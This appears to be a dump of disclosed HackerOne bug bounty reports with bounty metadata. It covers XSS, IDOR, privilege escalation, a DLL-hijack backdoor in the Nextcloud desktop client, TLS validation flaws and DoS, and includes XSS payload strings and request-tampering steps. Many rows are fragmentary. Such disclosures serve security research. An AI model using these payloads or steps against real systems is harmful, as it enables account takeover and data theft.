""><img src=x onerror=alert(document.cookie)>

To reproduce this vulnerability you must download the Mapbox Studio from here. Then you must write a random name and description. In the Attribution field you must inject the javascript code you want to execute. Save the changes again, upload the project and close the Mapbox Studio.
Now, log into your Mapbox account and go to Styles, select the style you have just created, this will expand the div, and click on ""New project"". The code will be already executed, but the vulnerability is not as much exploitable as we want.
We want everybody can execute our javascript code so, choose the settings you want in the project we created and save it. Go to your project list and search the project we have just saved. If we share this project, everybody who access to it will execute the code we have injected, including people without Mapbox account.

HI team, i hope you are good :)
Its a very simple logical flaw that results in this
So suppose we are victim@gmail.com , now login into the website then

go to account settings and then change mail address to victim111@gmail.com
a link will be sent to victim111@gmail.com, now the user realizes that he have lost access to victim111@gmail.com due to some reasons 
so he will probably change mail to the another mail address for e.g victim999@gmail.com which he owns and has access to
but it is found that even after verifying victim999@gmail.com, the old link which was sent to victim111@gmail.com is active, so user/attacker having access to that mail can verify it and takeover acc

In a nutshell : 
It is mandatory for a web app to invalidate the tokens in time to secure its user 
In this case, suppose while changing mail address the user mistakenly typed wrong mail address, so the link will be sent to that mail address. 
So the user probably don't want the user of that mail address to verify it, so he will quickly change his mail address to one he owns and verify it
what he doesn't know is that even after verification(change of major state), the old link is still active 
the flaw :
user changes mail to attacker@gmail.com -> user realizes that he mistyped the mail -> so he again changes to mail he owns and verifies it -> old link sent to attacker@gmail.com is still active even after new mail has been verified
Impact
An attacker can takeover acc due to misconfiguration, not invalidation of tokens at major state change, in time",https://hackerone.com/reports/1114347,California,United States,Palo Alto,2021,3,2,5,46
Mattermost,101-250,0.0,1m-10m,$900.00,High,7.1,Cross-site Scripting (XSS) - Reflected,Mattermost Server OAuth Flow Cross-Site Scripting,"shielder  submitted a report to Mattermost.Jun 3rd (about 1 year ago)Summary:
The vulnerability is a reflected Cross-Site Scripting (XSS) via the OAuth flow. A victim clicking a malicious link pointing to the target Mattermost host will trigger the XSS. If the victim is a regular user, it is possible to obtain all of their Mattermost chat contents; if it’s an administrator, it is possible to create a new administrator.
Root Cause Analysis:
The application fails to sanitize an HTTP query parameter before reflecting it within the HTML response during the OAuth flow.

Inside the ""RenderMobileMessage"" function (declared at line 117 of utils/api.go) ""fmt.Fprintln"" is called to print the HTTP response and the HTML page is dynamically built concatenating the ""message"" variable [1] (second argument of the function).
Call graph:
completeOAuth -(redirectURL=redirect_to)-> util.RenderMobileError(,redirectURL) -(message=string+redirectURL)-> RenderMobileMessage(,message) -> fmt.Fprintln(string+message)
Since the HTTP GET request parameter ""redirect_to"" is never sanitized and is appended to the HTML page, it is possible to trigger a reflected XSS.
Steps To Reproduce:


Visit the following URL after replacing <mattermost_url> with the domain/ip of the mattermost server instance:
https://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror=%22alert(%27zi0Black%20@%20Shielder%27)%22%3E

Impact
The following attack scenarios have been identified:

If the victim is a regular user, the attacker could read the messages sent and received by the user.
If the victim is an administrative user, the attacker could change the server settings (e.g. add a new administrative user).
1 attachment:F1324661: upload_43235b1bc0e676092457868cc1e2c7fe.pngSummary by shielderAndrea `zi0black` Cappa of Shielder found a Reflected Cross-Site Scripting (XSS) in the OAuth authentication flow of Mattermost. Once fixed he found a bypass for it which was promptly fixed by the Mattermost team.
The vulnerability could have been abused to hijack a victim session and based on their privileges steal their conversations / send messages (user) and/or add a new administrator on the Mattermost instance (admin).
All the details are available in the advisory published on Shielder's website: https://www.shielder.it/advisories/mattermost-server-reflected-xss-oauth/",https://hackerone.com/reports/1216203,California,United States,Palo Alto,2021,6,3,8,56

mattermost.cloud has a feature of making a channel and once its set to public any other user can join the channel and post comments on that channel. In System Console --> Channel --> Permission channel owner can assign wether member can post comment or not. Once channel owner selects that channel member can not post even than they can post the comment in channel.
Steps To Reproduce:


Step1: user1 █████ created a channel which is public and under System Console --> Channel --> Permission gives guest and members to post comment.


Step2: user2 █████ joined user1 channel mikefourchannel  (already joined)


Step3: user2 posted comment has permission to comment in channel in mikefourchannel  and captured the request and send it to repeater (


Step3: user2 ███████ also created a channel privilegeescalation (already done)


Step4: user1 █████ and under System Console --> Channel --> Permission  guest and members removes right to comment.


Step5: user2 ████████ now can not post any comment This channel is read only. Only members with permission can post here


Step6: user2 ██████ goes to channel privilegeescalation and posted comment and captures the request and used post request which was captured in Step3


Note:
In video POC at time 0:01:42 user2 commenting when he was having privilege of commenting in channel and there is only that comment has permission to comment in channel below there is no other comment now plz go to time 0:04:29  you can see user2 commented commenting in mike4 channel even no privielge in user1 channel without proper privileges

Moneybird,1-10,0.0,1m-10m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected XSS in Backend search,"krankopwnz  submitted a report to Moneybird.May 5th (7 years ago)The backend suffers from a reflected XSS because of missing filtering.
A prerequisite for this vuln is, that you enable the option to view invoices online ( this is just to see the id of the account to craft the payload. Maybe you can also find this number anywhere else... )
Steps to reproduce:
Login
Create an invoice
Enter the string ""test"" in the details of the invoice ( this is possible to get a search result back. the attacker later knows what is in his invoice and can use any word from within )
Fill the other required fields with any values
Send the invoice to a valid email address
When you receive the invoice, there is a link to view it online, like
https://moneybird.com/[id]/sales_invoices/29362c563a6eb7bfedad55cc0985d97a77202d65f6089ea54a6718910ce58108/5e5b5ac093069aa9657d87206c38919586b8f235c132175973c3b1a3a86c25fd
now copy the [id] ( should be your ID of course ) from the link and paste it into that one:
https://moneybird.com/[id]/search?search_query=test%22%20onclick%3Dalert%28document.domain%29
Now call it in any browser
You will see the search of moneybird with one result
If you click on that result, a javascript popup showing the current domain appears ( see screenshot 1 )
This is possible, because the searchvalue is not enclosed in Quotes ( see screenshot2 ), so it is possible to inject any eventhandler into the html code.
The worst thing that you can do with this vulnerability, is to redirect a moneybird user to a phishing page where he is prompted to enter his login credentials, or an attacker could even add hisself to the admins of the account and take it over completely. He could also mark his own invoice as paid and so do a financial loss to the victim.2 attachments:F91735: screenshot1.pngF91736: screenshot2.png",https://hackerone.com/reports/136600,Overijssel,Netherlands,Enschede,2016,5,5,19,2

Steps to Reproduce
From new user creation page: 

Add a new user to the account (https://account.newrelic.com/accounts/1523936/users/new)
Enter ""IDOR"" as the name and ""newrelic@newrelic.com"" as the email
Make them a ""user"" base role.
Click add user button.

From Alerts:

Click on Alert policies tab
Create new alert policy (https://alerts.newrelic.com/accounts/1523936/policies/new) 
Name it ""This is an IDOR"" 
Create the policy then go to notification channels of that policy (NOTE: Do NOT add applicable conditions, leave them blank. This is important for later). 
Click ""Add notification channels"", then ""select users""
Uncheck ALL users EXCEPT the user you want to IDOR (see screenshot below)

Click ""Update Policy"" 

From Synthetics:

Go to the ""create a new monitor"" page (https://synthetics.newrelic.com/accounts/ACCOUNT_ID/monitors/new)
Scroll down to the bottom of the page where it says ""Add to existing policy"" 
You can use the search bar to find ""IDOR"" (the policy you just made) or scroll down to where it shows your recently created alert policy with NO applicable conditions, exposing the full name of the user:

If a restricted user navigates to the AWS Integrations page, they are presented with this page (Sidenote: pay close attention to what I underlined too in this screenshot, there needs to be a space between the and users within that <div>):

Ok, so if a restricted user navigates to this page, they are at a dead end unless they get more permissions from the administrator... unless they force browse to the page they need to go. For example, simply navigating directly to the setup page (https://infrastructure.newrelic.com/accounts/{{ACC#}}/integrations/accounts/wizard/1/step/1) allows the restricted user to add their own AWS account. So, I followed along the instructions with my restricted account within AWS, attached the account, and was able to add the integration:

Nice! Looks like I don't need to be an admin after all. 
Steps to Reproduce:

Create a NR account
Add a user to the account with a Base Role of restricted, they should have Read Only access to Infrastructure.
Login as the Restricted User, navigate to https://infrastructure.newrelic.com/accounts/1523936/integrations/accounts/wizard/1/step to find out what Account ID and External ID needs to be used. Then once you have that info, navigate to https://infrastructure.newrelic.com/accounts/1523936/integrations/accounts/wizard/1/step/1 to enter the ARN code and connect your AWS account. 
Click Next, the connection will be made (if you've done the AWS setup correctly), and you've successfully elevated your privileges as a Restricted user! 

Let me know if you have questions.

jon_bottarini   posted a comment. Aug 2nd (5 years ago)Another bug, which isn't a security vulnerability, is that the URL structure of this page often breaks, rendering blank pages. I'm not entirely sure why this happens, but I have a feeling it's because the application doesn't check to see what page it's currently on, so sometimes when you click on an integration, this happens:
Image F209133: Screen_Shot_2017-08-01_at_10.28.03_PM.png 27.44 KiBZoom in Zoom out Copy Download
This happens randomly, but an easy way to reproduce this is to do the following:

Navigate to https://infrastructure.newrelic.com/accounts/1523936/integrations
Click on any integration
Refresh the page
Click on the ""Amazon Web Services"" tab once the page reloads
Click on an integration

You'll end up with a weird URL that looks like this:

New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Alerts] Internal API exposes Synthetics monitor details to a restricted user without view monitor permissions,"jon_bottarini  submitted a report to New Relic.Jul 25th (4 years ago)This bug requires a bunch of pre-setup, and a few conditions to make it work, but I'll do my best to write it out without making this a novel. 
You will need: 

Account that is an admin
Account that is a ""Restricted"" user, without any synthetics permissions (so, can't view monitors, can't edit monitors, etc). 

From the account that is an admin, create a new Synthetics monitor. You are building this Synthetics monitor to fail, each time. So for example, you want to create a monitor with a URL that checks for the ping response from a website that doesn't exist, such as ""lakfnas8df8hasfd.com"". 
The reason we need this to fail each time is that we are going to add a new alert to the monitor that checks for a failure. The alert condition page for this alert monitor should look something like this: 
Image F324217: Screen_Shot_2018-07-24_at_8.11.37_PM.png 96.32 KiBZoom in Zoom out Copy Download
Now - once you have this setup, you're going to get a lot of failures in NR Alerts, which will appear in the Events > Violations section. Here's what they look like: 
Image F324218: Screen_Shot_2018-07-24_at_8.12.43_PM.png 94.54 KiBZoom in Zoom out Copy Download
Here's where the bug is at - when you access this page as a restricted user - you can't see the important details about the monitor itself. You can see the name of the monitor, and that the monitor had an alert that failed, but you can't tell why or what asset is being monitored. 
However - there is an internal API JSON endpoint that leaks all this hidden info to the restricted user: 
https://alerts.newrelic.com/internal_api/1/accounts/1523936/monitor_failures/8f4a3a49-6355-4455-8480-79d93acdfda7?limit=1&reverse=true&start_timestamp=1
This endpoint shows the monitor failures for a specific monitor. Inside this response, you can see, as a restricted user, exactly why the monitor failed, and the asset that is being monitored: 
Image F324221: Screen_Shot_2018-07-24_at_8.22.01_PM.png 115.46 KiBZoom in Zoom out Copy Download 
This bypasses the ""view"" Synthetics restrictions put in place by the administrator. In order for the restricted user to get the ID of the monitor (in this example, it's 8f4a3a49-6355-4455-8480-79d93acdfda7), they just need to navigate to the incident and hover over the name of the monitor.

Thanks for your report! I've reproduced this finding, and have brought it to the attention of the Synthetics engineering team. We think that the remediation effort for #320200 can be applied to fix this one, too, so hopefully this won't take quite as long as some of our other remediations.
Unfortunately, the root cause of these issues—the fundamental differences in the authorization architecture between Synthetics and the rest of NR—isn't going to change for some time, and will likely remain a good place to hunt for bugs.
Another similar architectural boundary exists for the Insights product, and its concept of user-owned dashboards. That product also just entered the paid scope of our HackerOne program, and would probably make another great place to bug-hunt!

Here, we took the approach to scrub the sensitive data out, but leaving some innocuous stuff available.
Stuff that's now scrubbed out includes the monitor name, the error message, whatever terrifying things might have been in that secureCredentials field, etc. We leave only some GUIDs, timestamps, metadata, and performance info.

In this request the dashboard_id within the request body is not being validated, meaning that I can change this dashboard_id to any other number corresponding to a NR Insights dashboard, and I'll be able to modify the filter settings of other accounts. 
The application expects this value to be 687944 - which corresponds to the dashboard ID that I am currently modifying. However - if I change this value to 790637 (the dashboard ID of my completely separate, other account) the request is successful. 
Steps to Reproduce

From account A (victim) create a dashboard in NR Insights 
Copy down the dashboard ID for the dashboard you just created. Filter settings will be turned off be default. 
From account B (attacker) create a dashboard on your NR Insights account. 
Once created, click on ""Edit"" and then click the gear next to the ""filter disabled"" section
Change the settings on the filter and intercept the PUT request I pasted above to the /internal_api/1/accounts/ACCOUNTID/dashboards/DASHBOARDNUMBER/filter endpoint 
Change the dashboard_id number from the dashboard of account B to the victim's dashboard number. 

To confirm this, log back in to the victims account and you'll notice that the filter has been turned on the dashboard. 
The response will look like this: 
{""id"":642149,""dashboard_id"":790637,""key_names"":[],""event_types"":[""SyntheticsPrivateLocationStatus""],""filter_first"":false,""description"":{""plural"":"""",""singular"":""""},""escaped_event_types"":""`SyntheticsPrivateLocationStatus`""}

Haha - well I must admit since I first started hacking NR the internal API endpoint has been really nicely locked down... so there is definitely improvement! 
QQ for you, on the program policy it says that ""Cross account access"" would be ranked high - now I know this isn't the most earth-shattering bug in the world but I was wondering what the criteria was for ""cross account access"" since I can modify stuff on other accounts?

Steps to Reproduce:

Login as an admin and navigate to Synthetics. Make sure that Synthetics privileges are turned ON and the Restricted User is not given any privileges. 
Create a new monitor 
Navigate to the alert settings for the monitor (https://synthetics.newrelic.com/accounts/1523936/monitors/99657e19-ace3-483d-a5d4-d199f09e177b/conditions)
Click on the ""Add alert condition"" button 
Choose any alert condition and turn intercept on in Burp Suite before you click ""Save"". 

There will be a POST request that looks like this:

Now, from a restricted user account, login and navigate to Synthetics, the page should look like this:

All we have really changed here is that we've changed the GET /accounts/1523936/monitors HTTP/1.1 request to POST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1, we added the Content-Type: application/json;charset=utf-8 header, and we added the request itself:

If you get this response:
{""code"":415,""message"":""HTTP 415 Unsupported Media Type""}
It means you forgot to include the Content-Type: application/json;charset=utf-8 header in your request. 
A successful privilege escalation (if you've done the steps above correctly) will look like this:

It's located here: 
Image F326634: Screen_Shot_2018-07-30_at_11.14.15_PM.png 41.25 KiBZoom in Zoom out Copy Download
Now, in this section, if a user creates a new data app and sets the permissions to ""visible to others within my account"" it essentially provides read-only access to the data app and its associated variable. This permission can be defeated by another user quite easily, and to demonstrate we are going to use a match and replace rule within Burp. 
Steps to Reproduce
As the ""owner"" of the data app, navigate to https://insights.newrelic.com/apps/accounts/1523936 and click on ""Create data app""
Make sure that whatever you put here, the permissions setting is ""Visible to others in my account""
Now, from the ""restricted"" user who shouldn't have the ability to edit this data app, login to New Relic and head back to the apps section (https://insights.newrelic.com/apps/accounts/1523936)
In order to set this up correctly, go within Burp Suite Professional, then go to Proxy > Options > scroll down to ""Match and Replace"" and click on ""Add""
Within this, set the following setting:
Image F326633: Screen_Shot_2018-07-30_at_11.12.30_PM.png 33.20 KiBZoom in Zoom out Copy Download
Now, when you visit a data app that is set to ""visible to others on my account"" made by another user, you get the nice edit options in the upper right hand corner. 
Before this setting:

After enabling this setting (notice, the pencil icon):
(Note: if this doesn't happen immediately, you need to create a new data app from the restricted account and force it to refresh the data app permissions on this page).

Now, within the restricted account you can simply click on the pencil icon and be presented with this screen, only accessible to the actual owner of the data app:
Now, as the restricted user, we can make some changes like change the name of the app which results in a PUT request, as shown below:

Fear not - for I have returned. 
In #255894 you fixed the issue where a person could mass-harvest names of other New Relic users through the user management section. A fix was quickly pushed for this, but now I've found a workaround. I'm reporting this on the newrelic-vip program because it directly ties to a issue with Synthetics, surrounding the add users permissions feature. 
You managed to obscure the names of the accounts on the user management section:

Thank you for another great report! This is an interesting finding, as it really doesn't seem to fit cleanly into any of the categories defined in our policy (a sign that our policy could use some work).
I think this one falls a bit short of ""cross-account access"" – I feel that we've used the term in the past more to describe write access or significant amounts of read access to arbitrary accounts. On the other hand, this feels quite a bit heftier than most of the vulnerabilities in our 'Medium' category.
At the risk of being arbitrary, I've set the reward towards the higher end of the scale. This will provide a great discussion point for my team to review our current policy; if we do end up classifying vulnerabilities like this as 'High' severity, we will absolutely come back and make sure this reward is updated to reflect that.1 attachment:F220328: rKhNazo.gifahamlin   changed the status to Triaged. Sep 12th (5 years ago)

New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Synthetics] Restricted user can view synthetics monitors and user permissions through .json endpoint at /permissions/securablemetadata/{GROUP ID},"jon_bottarini  submitted a report to New Relic.Feb 28th (5 years ago)This report is two reports in one, but I figured why create two reports when the root cause is essentially the same exact endpoint. 
Description
When a restricted user with no permissions to view synthetics monitors tries to navigate to the permissions settings within Synthetics (https://synthetics.newrelic.com/accounts/1523936/permissions) , they are met with a screen that looks like this: 
Image F267795: Screen_Shot_2018-02-28_at_12.02.16_AM.png 382.14 KiBZoom in Zoom out Copy Download
womp womp... Nothing happens, and no content loads. I tried to play around with this a lot, and it's locked down for the most part - but then I noticed a weird request happening in my logs, occurring at this endpoint: 
https://synthetics.newrelic.com/accounts/1523936/permissions/securablemetadata/93623194.json
Surprisingly, I was able to not only view the permissions for the account id 93623194, but I was also able to see information about all the monitor's themselves:
Image F267796: Screen_Shot_2018-02-28_at_12.07.57_AM.png 349.91 KiBZoom in Zoom out Copy Download
Steps to Reproduce:

Login to NR as a restricted user with no Synthetics permissions
Navigate to https://synthetics.newrelic.com/accounts/1523936/permissions/securablemetadata/93623194.json

Response will contain all the monitors that you don't have permission to view, and the permission details belonging to the group id 93623194.
Let me know if there is any questions, thanks! 
Jon Bottarini
Impact
Two issues here: 
As a restricted user without Synthetics permissions, I can:

See all the monitors (and private minions) on the account  and their details (Rated: Medium)
See the permissions assigned to other user accounts by changing the ""93623194"" value to another group ID above. Since the group ID is just an 8 character number, it would be trivial to bruteforce all  the possible groups and determine the permission structure quite easily. (Rated: Medium)

And the response will be... all the monitors and all their data (interestingly, it actually contains a bunch more data than is usually provided within Synthetics, like the API version, AWS/Linode locations, which is pretty useless to an attacker but interesting nonetheless):

Steps to reproduce

Login to NR as a restricted user
Reload a page and intercept the request, send it to repeater in Burp so that it has your user cookies and everything
Replace the request in repeater by sending a GET request to /internal_api/1/accounts/1523936/conditions/load_synthetics_monitors 
Response will contain all the monitors that you don't have permission to view

Am I explaining this well enough? Hopefully the screenshot helps.

Even though the announcement admits that there are always workarounds out there to get hands on the file anyway, the workaround for this one is way too simple: Just add /download to the URL (like you used to for every public share) and your browser starts downloading unhesitently.
For the sharee, the checkbox ""Hide Download"" is therefore very deceptive, since they very likely weigh themselves in false safety.

Nextcloud,11-50,0.0,1m-10m,$100.00,Medium,6.4,Improper Access Control - Generic,Access control issue -- [Allow file system access not validated when using session auth],born2hack  submitted a report to Nextcloud.Jul 30th (4 years ago),https://hackerone.com/reports/388515,Baden-Württemberg,Germany,Stuttgart,2018,7,30,15,4
Nextcloud,11-50,0.0,1m-10m,$150.00,Medium,6.5,Insecure Direct Object Reference (IDOR),"Access control missing while viewing the attachments in the ""All boards""","dpx01  submitted a report to Nextcloud.Jul 6th (2 years ago)The vulnerability lies in the ""view attachment"" of the tasks . When a user uploads the file to the Task, the attachment is given a numeric number and is increased +1 on further uploads. It is easy for any user to view and download all the files uploaded to the tasks by any user. The access is not controlled with the session or csrf token.
Steps to Reproduce:

Connect to the server login with user A and visit the webpage. I used the provider ""us.cloudamo.com""
Visit https://us.cloudamo.com/apps/deck and create a task.
Upload any file to the attachments and capture the request. The request will looks like ""https://us.cloudamo.com/apps/deck/cards/8420/attachment/30"" where 30 is the ID of the uploaded attachment. 
Login with  user B and access the URL and you should be able to view the attachment of user A.
Since the attachment IDs are numerical number with poor entropy can be easily brute-forced and  one can get all the uploaded attachments by all the users of the particular  provider.

Impact
Unauthorized user can view and download the files of other users. This may leak the sensitive information of users.2 attachments:F896401: IDOR_01.pngF896402: IDOR_02.png",https://hackerone.com/reports/916704,Baden-Württemberg,Germany,Stuttgart,2020,7,6,13,35
Nextcloud,11-50,0.0,1m-10m,$750.00,Medium,6.8,Information Disclosure,Access to all files of remote user through shared file,"xuesheng  submitted a report to Nextcloud.Aug 8th (5 years ago)Steps to reproduce

User A shares a file ""movie.mp4"" with user B.
User B uses webdav to access files (e.g. foldersync or nautilus)
share is shown as regular file (using webdav).
Copy the file and paste it to the same folder (still using webdav).
A new folder will appear with the name ""(1)movie.mp4"". This folder contains all data of user A (which is quite scary). Folder structure looks like: files, files_trashbin, cache, etc. (all user related files).
I was able to reproduce this with different combination of users and shared files.

Expected behaviour
Only the shared file should be copied.
Actual behaviour
All files of remote user are copied.

Nextcloud,11-50,0.0,1m-10m,$100.00,Medium,4.8,Code Injection,Arbitrary code execution in desktop client via OpenSSL config,"l00ph0le  submitted a report to Nextcloud.Jun 20th (3 years ago)Summary:
The nextcloud windows desktop application utilizes a precompiled OpenSSL library called libeay32.dll. This OpenSSL library attempts to load c:\usr\local\ssl\openssl.cnf when the nextcloud windows application is launched. The c:\usr\local\ssl\openssl.cnf file does not exist. By default, on windows systems, authenticated users can create under the c: drive. A user with low privileges can create the file c:\usr\local\ssl\openssl.cnf configuration file to load a nefarious .dll library, resulting in arbitrary code execution when the nextcloud windows application is launched (by any user including an administrator).
Description:
If you download sys internals process monitor, you can see the “nextcloud.exe” binary trying to read the files “c:\usr\local\ssl\openssl.cnf” and getting a result of “PATH NOT FOUND”. See attached openssl-not-found.png screenshot.
The root cause of the issue is when the OpenSSL library (libeay32.dll) was compiled, the parameter “--openssldir” was not specified. If this parameter is not specified, a default of “/usr/local/ssl” is used. This is a real directory in linux, but in windows it translates to c:\usr\local\ssl.
If a low privilege user creates the directory structure c:\usr\local\ssl\, copies an openssl.cnf file and malicious .dll library inside it will result is arbitrary code execution when the nextcloud application is executed. If the nextcloud application is executed by an administrator, it will result in privilege escalation.
I’ve included two example exploits;
Exploit example 1
calc.c – source code of my .dll file to execute calc.exe
calc.dll – compiled version of the calc.exe library
openssl-calc.cnf – openssl configuration file that calls the calc.dll
Exploit example 2
backdoor.c – source code my .dll file to create a local administrator, this uses a known uac bypass
backdoor.dll – compiled version of the local admin backdoor library
openssl-backdoor.cnf – openssl configuration file that calls the backdoor.dll
Platform(s) Affected:
All supported windows platforms that support Nextcloud Desktop 2.5.2
Steps To Reproduce:
Download and Install Nextcloud desktop 2.5.2 (https://nextcloud.com/install/#install-clients)
Exploit 1 – calc.exe – See attached video calc.mp4

Login with a low privileged user (part of Users group)
Open a cmd.exe and issue command: mkdir c:\usr\local\ssl
Copy calc.dll and openssl-calc.cnf to c:\usr\local\ssl directory
Rename c:\usr\local\ssl\openssl-calc.cnf to c:\usr\local\ssl\openssl.cnf
Logout of low privledged user.
Login with local administrator.
Launch Nextcloud application.
Calc.exe with execute.

Exploit 2 – create a local admin user (uac bypass) – See attached video backdoor.mp4

Login with a low privileged user (part of Users group)
Open a cmd.exe and issue command: mkdir c:\usr\local\ssl
Copy calc.dll and openssl-backdoor.cnf to c:\usr\local\ssl directory
Rename c:\usr\local\ssl\openssl-backdoor.cnf to c:\usr\local\ssl\openssl.cnf
Logout of low privledged user.
Login with local administrator.
Launch Nextcloud application.
Open “Computer Management”
Navigate to “System Tools” -> “Local Users and Groups” -> “Users”
A new user of “backdoor” with a password of “backdoor” was added.
Right click on “backdoor” and click “Properties”, then click “Member Of”. 
The “backdoor” user is part of the local administrator group.

Supporting Material/References:
https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR
How can the system be exploited with this bug?
DLL Hi-jacking can be used for many nefarious purposes. It can be used by malware to propagate and establish persistence on a workstation. It can be used to privilege escalation in the post exploitation phases of an attack.
How did you come across this bug ?
I can across this while looking for programs that utilize the windows openssl (libeay32.dll) library.
Recommendations for fix
Recompile the openssl library (libeay32.dll), and specify the parameter “—openssldir”. Set the directory to something a low privledge user can’t edit for example “C:\Program Files (x86)\Nextcloud”. Use the link in the support material / references part of this report.
Impact
Impact
The impact is high. Successful exploitation leads to arbitrary code execution on the windows system. There are many actions a nefarious individual could accomplish with this vulnerability.

But to obtain the filelist they seem to use the SERVER/index.php/apps/files_sharing/shareinfo endpoint.
Unlike the other endpoint for tokens (like public link shares). There is no brute force protection here. So this could be used as enumeration endpoint for available tokens. This is not likely to generate a hit due to the search space. But considering you do limit this on the public link endpoint for example it still seems relevant.
Now this brings me to the second part that struck me on this endpoint. It is essentially sending back the entire file tree below it. Meaning if this is a big file tree it you could just keep sending requests to the server keeping it quite busy. (and all requests are valid and won't be flagged). There is no rate limiting at all.
Then this brings me to the final part This endpoint accepts all token shares. Even link share tokens (meaning you don't even have to use the 'add to your Nextcloud'),  (and there is no check if federation is enabled). So in short. If you have a link share with a big file tree (or you create it yourself if there is write access).

Nintendo,5001-10000,0.0,10m-50m,"$12,168.00",Critical,9.5,Improper Certificate Validation,[3DS][SSL] Improper certificate validation allows an attacker to perform MitM attacks,"mrnbayoh  submitted a report to Nintendo.Jun 9th (2 years ago)Summary by mrnbayohAffected Systems

Platform: (New) Nintendo 3DS
Region: ALL
System version: <= 11.13

Description
The SSL system module does not properly validate the x509 certificates when establishing an SSL/TLS connection. Actually, the SSL system module does not check the signatures when validating a certificate chain, allowing anyone to forge fake certificates and perform MitM attacks or spoof trusted servers.
Vulnerability
The SSL system module uses the RSA BSAFE MES library to implement SSL/TLS communications. This library is very customizable, and a lot of options can be turned on/off at multiple levels. In particular, according to the documentation, the library requires a ""resource list"" to be provided. The meaning of this list is to describe which aspects of the library will be activated or not.
Again, according to the documentation, the R_VERIFY_RES_SIGNATURE ""resource"" is needed to perform certificate signatures validation. However, this specific ""resource"" is not present in the list provided by the SSL module to the library. Hence, it does not validate certificate signatures even though the verification flag is set when creating SSL contexts, for example.
Impact
This vulnerability has a lot of impacts since it allows to spoof and perform MitM on any SSL/TLS connection established through the SSL module.
Here is a (probably non-exhaustive) list of what can done:

spoofing the NetUpdateSOAP and ECommerceSOAP endpoints used by the NIM module to:


bypass the system update verification
provide customized system updates packages (still need titles with CommonETickets)


this probably allows (untested) to install titles that came preinstalled on special editions like Super Smash Bros, Pokemon games, Zelda games etc.


spoofing the eShop servers, providing a new attack surface (eShop app)
MitM eShop communications to:


get user information & tokens
spy on commercial transactions
get user banking information (?)(untested)


MitM Friends & ACT communications to:


get user tokens & information (including NNID credentials)


spoofing connections to some game servers, providing new attack surfaces
MitM connections to some game servers, allowing to spy on communications
MitM/spoofing any other connection using the SSL module to establish SSL/TLS communications

And some things that cannot be done:

it is impossible to modify downloaded SpotPass data which are protected due to the signature verification of BOSS containers
it is impossible to spoof servers or doing MitM attacks when applications use some kind of webkit implementation, due to webkit having its own SSL/TLS implementation

Platform: (New) Nintendo 3DS 
Region: EU (all regions are affected)
System version: less or equal to 11.10 (latest)

Description
Since the bootroms have been dumped, it is now possible for an attacker to decrypt streetpass communications. Super Mario Maker is vulnerable to a buffer overflow vulnerability when parsing received levels.
Vulnerability
When parsing a compressed level received via StreetPass, the application decompress each compressed chunk of the file. The size of the received file cannot exceed 0x18000 bytes but the size isn't checked so the application will try to parse past the end of the compressed buffer if a greater size is provided. Even though we cannot send more than 0x18000 bytes, the decompressed buffer is located just after the compressed buffer.
Thus, one can craft a file where the first chunk is 0x18000 bytes long, the decompressed part is copied to compressed_buf+0x18000 and since the size isn't checked, the content at compressed_buf+0x18000 is parsed as the next compressed chunk and eventually copied past the end of the decompressed buffer. This makes it possible to overwrite objects on the heap and gain code execution.
Impact
This gives an attacker the ability to get userland remote code execution in Super Mario Maker.",https://hackerone.com/reports/687887,Washington,United States,Redmond,2019,9,4,15,50

NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

Summary: ""rejectUnauthorized: false"" disables all TLS validation, and should not be set in almost all circumstances. The documentation says only the specific 'false' value will disable this validation, but in fact a 'undefined' value does also disables it, unexpectedly disabling TLS entirely.
Description:
The documentation for tls.connect (https://nodejs.org/api/tls.html#tls_tls_connect_options_callback) says:

rejectUnauthorized <boolean> If not false, the server certificate is verified against the list of supplied CAs. An 'error' event is emitted if verification fails; err.code contains the OpenSSL error code. Default: true.

This is not true (see repro below) - in addition to false, an explicit undefined value does also disable server certificate verification.
This is very problematic, because it's reasonable to assume that undefined will be equivalent to setting the default, and it's also easy to accidentally produce undefined fields when dynamically building configuration. In any system that has done so, they are unknowingly silently not validating any TLS connections.
I've discovered this because I've found that https://www.npmjs.com/package/global-agent does exactly this (uses explicit undefineds when building options objects) and it is vulnerable because of this issue (i.e. all users of that package are by default unintentionally not validating TLS certificates for all connections).
This appears to affect all active node versions. Unless I'm missing something, this seems very bad.
Steps To Reproduce:
Repro code:
Code 259 BytesWrap lines Copy Download1const https = require('https');
2const request = https.get('https://expired.badssl.com', { rejectUnauthorized: undefined });
3request.on('error', (e) => console.log('Request failed:', e.message));
4request.on('response', (e) => console.log('Request succeeded'));

Run the above
The request succeeds! It should not, because expired.badssl.com by design has an expired TLS certificate
Remove the { rejectUnauthorized: undefined } option, or change it to 'true'
It fails, as expected, due to an expired certificate.

Impact:
This breaks all TLS and HTTPS security for anybody who accidentally provides an undefined value, assuming it will be equivalent to providing no value at all.
Impact
Breaks all HTTPS protections, so complete disclosure or trivial manipulation of all HTTPS requests and responses by anybody capable of MITMing the TCP connection.",https://hackerone.com/reports/1278254,California,United States,San Francisco,2021,7,26,16,29

Summary: 
The libuv's implementation of realpath is flawed on darwin and may cause buffer overflow.
Description: 
libuv's realpath implementation determines the buffer size with pathconf and fallback to _POSIX_PATH_MAX (256) if that fails for any reason (eg. ENOENT). However realpath requires a buffer of at least PATH_MAX (1024) bytes to be used, hence causes the buffer overflow if the resolved path is longer than 256 bytes.
Steps To Reproduce:

Node.js,11-50,0.0,1m-10m,$250.00,Critical,9.3,Denial of Service,Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests,"shogunpanda  submitted a report to Node.js.May 8th (3 years ago)Summary: Node.js is vulnerable to HTTP denial of service (DOS) attacks based on delayed requests submission which can make the server unable to accept new connections.
Description:
An attacker can open an arbitrary number of HTTP connections and keep the server busy by never completing the request phase.
Node.js only has two requests timeouts:

server.timeout that controls the maximum number of milliseconds the socket can be idle. This also includes the server processing time. 
server.headersTimeout (Added in Node 11.3.0), that controls the maximum number of milliseconds allowed to receive the full request headers before timing out.

